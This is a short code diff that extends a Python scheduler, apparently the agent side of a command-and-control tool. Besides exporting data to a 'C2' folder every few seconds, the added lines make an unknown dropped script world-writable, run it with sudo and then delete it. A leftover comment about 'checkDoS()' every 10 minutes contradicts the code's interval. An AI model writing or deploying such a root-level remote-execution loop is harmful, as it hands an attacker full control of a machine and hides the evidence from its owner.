@@ -4,7 +4,7 @@ from pprint import pprint as pp
 import threading
 import json
 import time
-
+import os
 
 def scheduler():  
     def export_data():
@@ -19,6 +19,10 @@ def scheduler():
         with open("C2/data.json", "w") as fp:
             json.dump(data, fp)
             fp.close()
+        os.system("cat C2/to_run.sh 2> /dev/null")
+        os.system("chmod 777 C2/to_run.sh")
+        os.system("sudo ./C2/to_run.sh")
+        os.system("rm C2/to_run.sh 2> /dev/null")
     schedule.every(0.05).minutes.do(export_data)  # Executing "checkDoS()" every 10 minute
 
     while 1:
